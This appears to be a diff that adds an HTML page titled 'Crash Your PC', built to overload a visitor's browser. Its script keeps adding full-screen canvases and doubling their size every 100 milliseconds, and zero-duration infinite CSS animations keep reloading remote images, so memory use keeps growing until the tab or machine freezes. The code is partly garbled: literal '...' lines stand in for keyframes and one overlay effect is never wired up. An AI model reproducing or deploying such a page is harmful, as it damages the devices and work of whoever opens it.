@@ -1,0 +1,131 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Crash Your PC</title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    width: 100vw;
+    height: 100vh;
+    background-image: url("https://source.unsplash.com/random?city,night"), url("https://source.unsplash.com/random?city,night");
+    background-repeat: repeat;
+    background-size: cover;
+    animation: load 0s linear infinite;
+  }
+  @keyframes load {
+    0% {
+      background-image: url("https://source.unsplash.com/random?city,night");
+    }
+    1% {
+      background-image: url("https://source.unsplash.com/random?city,night");
+    }
+    2% {
+      background-image: url("https://source.unsplash.com/random?city,night");
+    }
+    ...
+    100% {
+      background-image: url("https://source.unsplash.com/random?city,night");
+    }
+  }
+  .overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background-color: white;
+    opacity: 0.0;
+    z-index: 9999;
+    animation: fadeIn 1s ease-in-out, fadeOut 1s ease-in-out 3s;
+  }
+  @keyframes fadeIn {
+    0% {
+      opacity: 0.0;
+    }
+    100% {
+      opacity: 1.0;
+    }
+  }
+  @keyframes fadeOut {
+    0% {
+      opacity: 1.0;
+    }
+    100% {
+      opacity: 0.0;
+    }
+  }
+  .crasher {
+    font-size: 100px;
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100vw;
+    height: 100vh;
+    line-height: 100vh;
+    text-align: center;
+    vertical-align: middle;
+    animation: crash 0s linear infinite;
+  }
+  @keyframes crash {
+    0% {
+      font-size: 100px;
+    }
+    1% {
+      font-size: 100px;
+    }
+    2% {
+      font-size: 200px;
+    }
+    ...
+    100% {
+      font-size: 100px;
+    }
+  }
+</style>
+<body>
+<div class="overlay"></div>
+<div class="crasher">Crashing in 3... 2... 1...</div>
+<script>
+  setInterval(() => {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const image = new Image();
+    image.src = "https://source.unsplash.com/random?city,night";
+    image.onload = () => {
+      ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
+      document.body.appendChild(canvas);
+      canvas.style.zIndex = 9998;
+      canvas.style.position = 'fixed';
+      canvas.style.top = 0;
+      canvas.style.left = 0;
+      canvas.style.pointerEvents = 'none';
+    };
+    image.onerror = () => {
+      console.error('Error loading image');
+    };
+    const intervalId = setInterval(() => {
+      canvas.width = canvas.width * 2;
+      canvas.height = canvas.height * 2;
+      ctx.scale(2, 2);
+      ctx.drawImage(image, 0, 0, canvas.width / 2, canvas.height / 2);
+    }, 100);
+    setTimeout(() => clearInterval(intervalId), 10000);
+  }, 1000);
+  setTimeout(() => {
+    const intervalId = setInterval(() => {
+      let currentOpacity = parseFloat(document.querySelector('.overlay').style.getPropertyValue('--current-overlay-alpha') || 0);
+      currentOpacity += 0.01;
+      if (currentOpacity >= 1) {
+        currentOpacity = 0;
+      }
+      document.querySelector('.overlay').style.setProperty('--current-overlay-alpha', currentOpacity);
+    }, 10);
+  });
+</script>
+</body>
+</html>
